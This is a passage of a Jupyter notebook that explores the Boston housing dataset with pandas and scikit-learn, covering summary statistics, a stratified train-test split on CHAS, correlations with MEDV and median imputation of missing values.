    <td>0.538000</td>\\n\",\n       \"      <td>6.208500</td>\\n\",\n       \"      <td>77.500000</td>\\n\",\n       \"      <td>3.207450</td>\\n\",\n       \"      <td>5.000000</td>\\n\",\n       \"      <td>330.000000</td>\\n\",\n       \"      <td>19.050000</td>\\n\",\n       \"      <td>391.440000</td>\\n\",\n       \"      <td>11.360000</td>\\n\",\n       \"      <td>21.200000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>75%</th>\\n\",\n       \"      <td>3.677082</td>\\n\",\n       \"      <td>12.500000</td>\\n\",\n       \"      <td>18.100000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.624000</td>\\n\",\n       \"      <td>6.623500</td>\\n\",\n       \"      <td>94.075000</td>\\n\",\n       \"      <td>5.188425</td>\\n\",\n       \"      <td>24.000000</td>\\n\",\n       \"      <td>666.000000</td>\\n\",\n       \"      <td>20.200000</td>\\n\",\n       \"      <td>396.225000</td>\\n\",\n       \"      <td>16.955000</td>\\n\",\n       \"      <td>25.000000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>max</th>\\n\",\n       \"      <td>88.976200</td>\\n\",\n       \"      <td>100.000000</td>\\n\",\n       \"      <td>27.740000</td>\\n\",\n       \"      <td>1.000000</td>\\n\",\n       \"      <td>0.871000</td>\\n\",\n       \"      <td>8.780000</td>\\n\",\n       \"      <td>100.000000</td>\\n\",\n       \"      <td>12.126500</td>\\n\",\n       \"      <td>24.000000</td>\\n\",\n       \"      <td>711.000000</td>\\n\",\n       \"      <td>22.000000</td>\\n\",\n       \"      <td>396.900000</td>\\n\",\n       \"      <td>37.970000</td>\\n\",\n       \"      <td>50.000000</td>\\n\",\n       \"    </tr>\\n\",\n       \"  </tbody>\\n\",\n       \"</table>\\n\",\n       \"</div>\"\n      ],\n      \"text/plain\": [\n       \"            CRIM           ZN       INDUS        CHAS         NOX          RM  \\\\\\n\",\n       \"count  506.000000  506.000000  506.000000  506.000000  506.000000  506.000000   \\n\",\n       \"mean     3.613524   11.363636   11.136779    0.069170    0.554695    6.284634   \\n\",\n       \"std      8.601545   23.322453    6.860353    0.253994    0.115878    0.702617   \\n\",\n       \"min      0.006320    0.000000    0.460000    0.000000    0.385000    3.561000   \\n\",\n       \"25%      0.082045    0.000000    5.190000    0.000000    0.449000    5.885500   \\n\",\n       \"50%      0.256510    0.000000    9.690000    0.000000    0.538000    6.208500   \\n\",\n       \"75%      3.677082   12.500000   18.100000    0.000000    0.624000    6.623500   \\n\",\n       \"max     88.976200  100.000000   27.740000    1.000000    0.871000    8.780000   \\n\",\n       \"\\n\",\n       \"              AGE         DIS         RAD         TAX     PTRATIO           B  \\\\\\n\",\n       \"count  506.000000  506.000000  506.000000  506.000000  506.000000  506.000000   \\n\",\n       \"mean    68.574901    3.795043    9.549407  408.237154   18.455534  356.674032   \\n\",\n       \"std     28.148861    2.105710    8.707259  168.537116    2.164946   91.294864   \\n\",\n       \"min      2.900000    1.129600    1.000000  187.000000   12.600000    0.320000   \\n\",\n       \"25%     45.025000    2.100175    4.000000  279.000000   17.400000  375.377500   \\n\",\n       \"50%     77.500000    3.207450    5.000000  330.000000   19.050000  391.440000   \\n\",\n       \"75%     94.075000    5.188425   24.000000  666.000000   20.200000  396.225000   \\n\",\n       \"max    100.000000   12.126500   24.000000  711.000000   22.000000  396.900000   \\n\",\n       \"\\n\",\n       \"            LSTAT        MEDV  \\n\",\n       \"count  506.000000  506.000000  \\n\",\n       \"mean    12.653063   22.532806  \\n\",\n       \"std      7.141062    9.197104  \\n\",\n       \"min      1.730000    5.000000  \\n\",\n       \"25%      6.950000   17.025000  \\n\",\n       \"50%     11.360000   21.200000  \\n\",\n       \"75%     16.955000   25.000000  \\n\",\n       \"max     37.970000   50.000000  \"\n      ]\n     },\n     \"execution_count\": 5,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"housing.describe()\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 6,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"%matplotlib inline\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 7,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"import matplotlib.pyplot as plt\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 8,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"array([[<AxesSubplot:title={'center':'CRIM '}>,\\n\",\n       \"        <AxesSubplot:title={'center':'ZN'}>,\\n\",\n       \"        <AxesSubplot:title={'center':'INDUS'}>,\\n\",\n       \"        <AxesSubplot:title={'center':'CHAS'}>],\\n\",\n       \"       [<AxesSubplot:title={'center':'NOX'}>,\\n\",\n       \"        <AxesSubplot:title={'center':'RM'}>,\\n\",\n       \"        <AxesSubplot:title={'center':'AGE'}>,\\n\",\n       \"        <AxesSubplot:title={'center':'DIS'}>],\\n\",\n       \"       [<AxesSubplot:title={'center':'RAD'}>,\\n\",\n       \"        <AxesSubplot:title={'center':'TAX'}>,\\n\",\n       \"        <AxesSubplot:title={'center':'PTRATIO'}>,\\n\",\n       \"        <AxesSubplot:title={'center':'B'}>],\\n\",\n       \"       [<AxesSubplot:title={'center':'LSTAT'}>,\\n\",\n       \"        <AxesSubplot:title={'center':'MEDV'}>, <AxesSubplot:>,\\n\",\n       \"        <AxesSubplot:>]], dtype=object)\"\n      ]\n     },\n     \"execution_count\": 8,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    },\n    {\n     \"data\": {\n      \"image/png\": \"\\n\",\n      \"text/plain\": [\n       \"<Figure size 1440x1080 with 16 Axes>\"\n      ]\n     },\n     \"metadata\": {\n      \"needs_background\": \"light\"\n     },\n     \"output_type\": \"display_data\"\n    }\n   ],\n   \"source\": [\n    \"housing.hist(bins=50,figsize=(20,15))\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"# Train-Test Splitting\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 9,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"import numpy as np\\n\",\n    \"def split_train_test(data, test_ratio):\\n\",\n    \"    np.random.seed(42)\\n\",\n    \"    shuffled =np.random.permutation(len(data))\\n\",\n    \"    test_set_size =int(len(data)*test_ratio)\\n\",\n    \"    test_indices = shuffled[:test_set_size]\\n\",\n    \"    train_indices = shuffled[test_set_size:]\\n\",\n    \"    return data.iloc[train_indices],data.iloc[test_indices]\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 10,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"train_set, test_set =split_train_test(housing,0.2)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 11,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"name\": \"stdout\",\n     \"output_type\": \"stream\",\n     \"text\": [\n      \"Rows in train set: 405 \\n\",\n      \"Rows in test set : 101\\n\"\n     ]\n    }\n   ],\n   \"source\": [\n    \"print(f\\\"Rows in train set: {len(train_set)} \\\\nRows in test set : {len(test_set)}\\\")\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 12,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"name\": \"stdout\",\n     \"output_type\": \"stream\",\n     \"text\": [\n      \"Rows in train set: 404 \\n\",\n      \"Rows in test set : 102\\n\"\n     ]\n    }\n   ],\n   \"source\": [\n    \"from sklearn.model_selection import train_test_split\\n\",\n    \"train_set, test_set =train_test_split(housing, test_size=0.2, random_state=42)\\n\",\n    \"print(f\\\"Rows in train set: {len(train_set)} \\\\nRows in test set : {len(test_set)}\\\")\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 13,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"from sklearn.model_selection import StratifiedShuffleSplit\\n\",\n    \"split= StratifiedShuffleSplit(n_splits=1,test_size=0.2, random_state=42)\\n\",\n    \"for train_index, test_index in split.split(housing, housing['CHAS']):\\n\",\n    \"    strat_train_set=housing.loc[train_index]\\n\",\n    \"    strat_test_set=housing.loc[test_index]\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 14,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/html\": [\n       \"<div>\\n\",\n       \"<style scoped>\\n\",\n       \"    .dataframe tbody tr th:only-of-type {\\n\",\n       \"        vertical-align: middle;\\n\",\n       \"    }\\n\",\n       \"\\n\",\n       \"    .dataframe tbody tr th {\\n\",\n       \"        vertical-align: top;\\n\",\n       \"    }\\n\",\n       \"\\n\",\n       \"    .dataframe thead th {\\n\",\n       \"        text-align: right;\\n\",\n       \"    }\\n\",\n       \"</style>\\n\",\n       \"<table border=\\\"1\\\" class=\\\"dataframe\\\">\\n\",\n       \"  <thead>\\n\",\n       \"    <tr style=\\\"text-align: right;\\\">\\n\",\n       \"      <th></th>\\n\",\n       \"      <th>CRIM</th>\\n\",\n       \"      <th>ZN</th>\\n\",\n       \"      <th>INDUS</th>\\n\",\n       \"      <th>CHAS</th>\\n\",\n       \"      <th>NOX</th>\\n\",\n       \"      <th>RM</th>\\n\",\n       \"      <th>AGE</th>\\n\",\n       \"      <th>DIS</th>\\n\",\n       \"      <th>RAD</th>\\n\",\n       \"      <th>TAX</th>\\n\",\n       \"      <th>PTRATIO</th>\\n\",\n       \"      <th>B</th>\\n\",\n       \"      <th>LSTAT</th>\\n\",\n       \"      <th>MEDV</th>\\n\",\n       \"    </tr>\\n\",\n       \"  </thead>\\n\",\n       \"  <tbody>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>count</th>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"      <td>102.000000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>mean</th>\\n\",\n       \"      <td>3.655942</td>\\n\",\n       \"      <td>13.450980</td>\\n\",\n       \"      <td>10.312255</td>\\n\",\n       \"      <td>0.068627</td>\\n\",\n       \"      <td>0.541353</td>\\n\",\n       \"      <td>6.303353</td>\\n\",\n       \"      <td>66.733333</td>\\n\",\n       \"      <td>3.988460</td>\\n\",\n       \"      <td>8.813725</td>\\n\",\n       \"      <td>391.980392</td>\\n\",\n       \"      <td>18.385294</td>\\n\",\n       \"      <td>369.670196</td>\\n\",\n       \"      <td>12.104314</td>\\n\",\n       \"      <td>22.625490</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>std</th>\\n\",\n       \"      <td>10.400966</td>\\n\",\n       \"      <td>27.503241</td>\\n\",\n       \"      <td>6.761154</td>\\n\",\n       \"      <td>0.254068</td>\\n\",\n       \"      <td>0.111397</td>\\n\",\n       \"      <td>0.662996</td>\\n\",\n       \"      <td>27.772183</td>\\n\",\n       \"      <td>2.131247</td>\\n\",\n       \"      <td>8.614667</td>\\n\",\n       \"      <td>167.837379</td>\\n\",\n       \"      <td>2.310604</td>\\n\",\n       \"      <td>68.075774</td>\\n\",\n       \"      <td>6.759257</td>\\n\",\n       \"      <td>8.452344</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>min</th>\\n\",\n       \"      <td>0.009060</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.460000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.385000</td>\\n\",\n       \"      <td>4.138000</td>\\n\",\n       \"      <td>6.500000</td>\\n\",\n       \"      <td>1.137000</td>\\n\",\n       \"      <td>1.000000</td>\\n\",\n       \"      <td>188.000000</td>\\n\",\n       \"      <td>12.600000</td>\\n\",\n       \"      <td>3.650000</td>\\n\",\n       \"      <td>2.470000</td>\\n\",\n       \"      <td>5.000000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>25%</th>\\n\",\n       \"      <td>0.057828</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>4.950000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.448000</td>\\n\",\n       \"      <td>5.912750</td>\\n\",\n       \"      <td>45.850000</td>\\n\",\n       \"      <td>2.223650</td>\\n\",\n       \"      <td>4.000000</td>\\n\",\n       \"      <td>270.000000</td>\\n\",\n       \"      <td>16.800000</td>\\n\",\n       \"      <td>377.685000</td>\\n\",\n       \"      <td>7.480000</td>\\n\",\n       \"      <td>18.925000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>50%</th>\\n\",\n       \"      <td>0.176150</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>7.760000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.515000</td>\\n\",\n       \"      <td>6.176000</td>\\n\",\n       \"      <td>71.100000</td>\\n\",\n       \"      <td>3.422950</td>\\n\",\n       \"      <td>5.000000</td>\\n\",\n       \"      <td>307.000000</td>\\n\",\n       \"      <td>19.150000</td>\\n\",\n       \"      <td>393.740000</td>\\n\",\n       \"      <td>10.565000</td>\\n\",\n       \"      <td>21.500000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>75%</th>\\n\",\n       \"      <td>2.061955</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>18.100000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.612750</td>\\n\",\n       \"      <td>6.539500</td>\\n\",\n       \"      <td>93.500000</td>\\n\",\n       \"      <td>5.609225</td>\\n\",\n       \"      <td>8.000000</td>\\n\",\n       \"      <td>461.000000</td>\\n\",\n       \"      <td>20.200000</td>\\n\",\n       \"      <td>396.900000</td>\\n\",\n       \"      <td>16.267500</td>\\n\",\n       \"      <td>25.000000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>max</th>\\n\",\n       \"      <td>88.976200</td>\\n\",\n       \"      <td>90.000000</td>\\n\",\n       \"      <td>27.740000</td>\\n\",\n       \"      <td>1.000000</td>\\n\",\n       \"      <td>0.871000</td>\\n\",\n       \"      <td>8.725000</td>\\n\",\n       \"      <td>100.000000</td>\\n\",\n       \"      <td>10.585700</td>\\n\",\n       \"      <td>24.000000</td>\\n\",\n       \"      <td>711.000000</td>\\n\",\n       \"      <td>22.000000</td>\\n\",\n       \"      <td>396.900000</td>\\n\",\n       \"      <td>37.970000</td>\\n\",\n       \"      <td>50.000000</td>\\n\",\n       \"    </tr>\\n\",\n       \"  </tbody>\\n\",\n       \"</table>\\n\",\n       \"</div>\"\n      ],\n      \"text/plain\": [\n       \"            CRIM           ZN       INDUS        CHAS         NOX          RM  \\\\\\n\",\n       \"count  102.000000  102.000000  102.000000  102.000000  102.000000  102.000000   \\n\",\n       \"mean     3.655942   13.450980   10.312255    0.068627    0.541353    6.303353   \\n\",\n       \"std     10.400966   27.503241    6.761154    0.254068    0.111397    0.662996   \\n\",\n       \"min      0.009060    0.000000    0.460000    0.000000    0.385000    4.138000   \\n\",\n       \"25%      0.057828    0.000000    4.950000    0.000000    0.448000    5.912750   \\n\",\n       \"50%      0.176150    0.000000    7.760000    0.000000    0.515000    6.176000   \\n\",\n       \"75%      2.061955    0.000000   18.100000    0.000000    0.612750    6.539500   \\n\",\n       \"max     88.976200   90.000000   27.740000    1.000000    0.871000    8.725000   \\n\",\n       \"\\n\",\n       \"              AGE         DIS         RAD         TAX     PTRATIO           B  \\\\\\n\",\n       \"count  102.000000  102.000000  102.000000  102.000000  102.000000  102.000000   \\n\",\n       \"mean    66.733333    3.988460    8.813725  391.980392   18.385294  369.670196   \\n\",\n       \"std     27.772183    2.131247    8.614667  167.837379    2.310604   68.075774   \\n\",\n       \"min      6.500000    1.137000    1.000000  188.000000   12.600000    3.650000   \\n\",\n       \"25%     45.850000    2.223650    4.000000  270.000000   16.800000  377.685000   \\n\",\n       \"50%     71.100000    3.422950    5.000000  307.000000   19.150000  393.740000   \\n\",\n       \"75%     93.500000    5.609225    8.000000  461.000000   20.200000  396.900000   \\n\",\n       \"max    100.000000   10.585700   24.000000  711.000000   22.000000  396.900000   \\n\",\n       \"\\n\",\n       \"            LSTAT        MEDV  \\n\",\n       \"count  102.000000  102.000000  \\n\",\n       \"mean    12.104314   22.625490  \\n\",\n       \"std      6.759257    8.452344  \\n\",\n       \"min      2.470000    5.000000  \\n\",\n       \"25%      7.480000   18.925000  \\n\",\n       \"50%     10.565000   21.500000  \\n\",\n       \"75%     16.267500   25.000000  \\n\",\n       \"max     37.970000   50.000000  \"\n      ]\n     },\n     \"execution_count\": 14,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"strat_test_set.describe()\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 15,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"0    95\\n\",\n       \"1     7\\n\",\n       \"Name: CHAS, dtype: int64\"\n      ]\n     },\n     \"execution_count\": 15,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"strat_test_set['CHAS'].value_counts()\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 16,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"0    376\\n\",\n       \"1     28\\n\",\n       \"Name: CHAS, dtype: int64\"\n      ]\n     },\n     \"execution_count\": 16,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"strat_train_set['CHAS'].value_counts()\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 17,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"housing= strat_train_set.copy()   # use just after split data\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"## Looking for Correlations\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 18,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"corr_matrix = housing.corr()\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 19,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"MEDV       1.000000\\n\",\n       \"RM         0.679894\\n\",\n       \"B          0.361761\\n\",\n       \"ZN         0.339741\\n\",\n       \"DIS        0.240451\\n\",\n       \"CHAS       0.205066\\n\",\n       \"AGE       -0.364596\\n\",\n       \"RAD       -0.374693\\n\",\n       \"CRIM      -0.393715\\n\",\n       \"NOX       -0.422873\\n\",\n       \"TAX       -0.456657\\n\",\n       \"INDUS     -0.473516\\n\",\n       \"PTRATIO   -0.493534\\n\",\n       \"LSTAT     -0.740494\\n\",\n       \"Name: MEDV, dtype: float64\"\n      ]\n     },\n     \"execution_count\": 19,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"corr_matrix['MEDV'].sort_values(ascending=False)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 20,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"array([[<AxesSubplot:xlabel='MEDV', ylabel='MEDV'>,\\n\",\n       \"        <AxesSubplot:xlabel='RM', ylabel='MEDV'>,\\n\",\n       \"        <AxesSubplot:xlabel='ZN', ylabel='MEDV'>,\\n\",\n       \"        <AxesSubplot:xlabel='LSTAT', ylabel='MEDV'>],\\n\",\n       \"       [<AxesSubplot:xlabel='MEDV', ylabel='RM'>,\\n\",\n       \"        <AxesSubplot:xlabel='RM', ylabel='RM'>,\\n\",\n       \"        <AxesSubplot:xlabel='ZN', ylabel='RM'>,\\n\",\n       \"        <AxesSubplot:xlabel='LSTAT', ylabel='RM'>],\\n\",\n       \"       [<AxesSubplot:xlabel='MEDV', ylabel='ZN'>,\\n\",\n       \"        <AxesSubplot:xlabel='RM', ylabel='ZN'>,\\n\",\n       \"        <AxesSubplot:xlabel='ZN', ylabel='ZN'>,\\n\",\n       \"        <AxesSubplot:xlabel='LSTAT', ylabel='ZN'>],\\n\",\n       \"       [<AxesSubplot:xlabel='MEDV', ylabel='LSTAT'>,\\n\",\n       \"        <AxesSubplot:xlabel='RM', ylabel='LSTAT'>,\\n\",\n       \"        <AxesSubplot:xlabel='ZN', ylabel='LSTAT'>,\\n\",\n       \"        <AxesSubplot:xlabel='LSTAT', ylabel='LSTAT'>]], dtype=object)\"\n      ]\n     },\n     \"execution_count\": 20,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    },\n    {\n     \"data\": {\n      \"image/png\": \"\\n\",\n      \"text/plain\": [\n       \"<Figure size 864x576 with 16 Axes>\"\n      ]\n     },\n     \"metadata\": {\n      \"needs_background\": \"light\"\n     },\n     \"output_type\": \"display_data\"\n    }\n   ],\n   \"source\": [\n    \"from pandas.plotting import scatter_matrix\\n\",\n    \"attributes=[\\\"MEDV\\\",\\\"RM\\\",\\\"ZN\\\",\\\"LSTAT\\\"]\\n\",\n    \"scatter_matrix(housing[attributes],figsize =(12,8))\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 21,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"<AxesSubplot:xlabel='RM', ylabel='MEDV'>\"\n      ]\n     },\n     \"execution_count\": 21,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    },\n    {\n     \"data\": {\n      \"image/png\": \"\\n\",\n      \"text/plain\": [\n       \"<Figure size 432x288 with 1 Axes>\"\n      ]\n     },\n     \"metadata\": {\n      \"needs_background\": \"light\"\n     },\n     \"output_type\": \"display_data\"\n    }\n   ],\n   \"source\": [\n    \"housing.plot(kind=\\\"scatter\\\",x=\\\"RM\\\",y=\\\"MEDV\\\",alpha=0.8)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 22,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"housing = strat_train_set.drop(\\\"MEDV\\\", axis=1)\\n\",\n    \"housing_labels = strat_train_set[\\\"MEDV\\\"].copy()\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"## Missing  Attributes\"\n   ]\n  },\n  {\n   \"cell_type\": \"raw\",\n   \"metadata\": {},\n   \"source\": [\n    \"To take care of missing attributes, you have 3 options\\n\",\n    \" 1. get Rid of the missing data points\\n\",\n    \"    a=housing.dropna(subset=[\\\"RM\\\"])\\n\",\n    \"    a.shape\\n\",\n    \" 2. Get rid of the whole attribute\\n\",\n    \"     housing.drop(\\\"RM\\\", axis=1)\\n\",\n    \" 3. Set the value to some value(0,mean or medium)\\n\",\n    \"    #median=housing[\\\"RM\\\"].median()\\n\",\n    \"    #housing[\\\"RM\\\"].fillna(median)\\n\",\n    \"    #housing.shape\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 23,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"(404, 13)\"\n      ]\n     },\n     \"execution_count\": 23,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"median=housing[\\\"RM\\\"].median()\\n\",\n    \"housing[\\\"RM\\\"].fillna(median)\\n\",\n    \"housing.shape\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 24,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"SimpleImputer(strategy='median')\"\n      ]\n     },\n     \"execution_count\": 24,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"from sklearn.impute import SimpleImputer\\n\",\n    \"imputer = SimpleImputer(strategy = \\\"median\\\")\\n\",\n    \"imputer.fit(housing)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 25,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"array([2.86735e-01, 0.00000e+00, 9.90000e+00, 0.00000e+00, 5.38000e-01,\\n\",\n       \"       6.21000e+00, 7.82000e+01, 3.12220e+00, 5.00000e+00, 3.37000e+02,\\n\",\n       \"       1.90000e+01, 3.90955e+02, 1.15700e+01])\"\n      ]\n     },\n     \"execution_count\": 25,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"imputer.statistics_.shape\\n\",\n    \"imputer.statistics_\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 26,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/html\": [\n       \"<div>\\n\",\n       \"<style scoped>\\n\",\n       \"    .dataframe tbody tr th:only-of-type {\\n\",\n       \"        vertical-align: middle;\\n\",\n       \"    }\\n\",\n       \"\\n\",\n       \"    .dataframe tbody tr th {\\n\",\n       \"        vertical-align: top;\\n\",\n       \"    }\\n\",\n       \"\\n\",\n       \"    .dataframe thead th {\\n\",\n       \"        text-align: right;\\n\",\n       \"    }\\n\",\n       \"</style>\\n\",\n       \"<table border=\\\"1\\\" class=\\\"dataframe\\\">\\n\",\n       \"  <thead>\\n\",\n       \"    <tr style=\\\"text-align: right;\\\">\\n\",\n       \"      <th></th>\\n\",\n       \"      <th>CRIM</th>\\n\",\n       \"      <th>ZN</th>\\n\",\n       \"      <th>INDUS</th>\\n\",\n       \"      <th>CHAS</th>\\n\",\n       \"      <th>NOX</th>\\n\",\n       \"      <th>RM</th>\\n\",\n       \"      <th>AGE</th>\\n\",\n       \"      <th>DIS</th>\\n\",\n       \"      <th>RAD</th>\\n\",\n       \"      <th>TAX</th>\\n\",\n       \"      <th>PTRATIO</th>\\n\",\n       \"      <th>B</th>\\n\",\n       \"      <th>LSTAT</th>\\n\",\n       \"    </tr>\\n\",\n       \"  </thead>\\n\",\n       \"  <tbody>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>count</th>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"      <td>404.000000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>mean</th>\\n\",\n       \"      <td>3.602814</td>\\n\",\n       \"      <td>10.836634</td>\\n\",\n       \"      <td>11.344950</td>\\n\",\n       \"      <td>0.069307</td>\\n\",\n       \"      <td>0.558064</td>\\n\",\n       \"      <td>6.279908</td>\\n\",\n       \"      <td>69.039851</td>\\n\",\n       \"      <td>3.746210</td>\\n\",\n       \"      <td>9.735149</td>\\n\",\n       \"      <td>412.341584</td>\\n\",\n       \"      <td>18.473267</td>\\n\",\n       \"      <td>353.392822</td>\\n\",\n       \"      <td>12.791609</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>std</th>\\n\",\n       \"      <td>8.099383</td>\\n\",\n       \"      <td>22.150636</td>\\n\",\n       \"      <td>6.877817</td>\\n\",\n       \"      <td>0.254290</td>\\n\",\n       \"      <td>0.116875</td>\\n\",\n       \"      <td>0.712983</td>\\n\",\n       \"      <td>28.258248</td>\\n\",\n       \"      <td>2.099057</td>\\n\",\n       \"      <td>8.731259</td>\\n\",\n       \"      <td>168.672623</td>\\n\",\n       \"      <td>2.129243</td>\\n\",\n       \"      <td>96.069235</td>\\n\",\n       \"      <td>7.235740</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>min</th>\\n\",\n       \"      <td>0.006320</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.740000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.389000</td>\\n\",\n       \"      <td>3.561000</td>\\n\",\n       \"      <td>2.900000</td>\\n\",\n       \"      <td>1.129600</td>\\n\",\n       \"      <td>1.000000</td>\\n\",\n       \"      <td>187.000000</td>\\n\",\n       \"      <td>13.000000</td>\\n\",\n       \"      <td>0.320000</td>\\n\",\n       \"      <td>1.730000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>25%</th>\\n\",\n       \"      <td>0.086963</td>\\n\",\n       \"      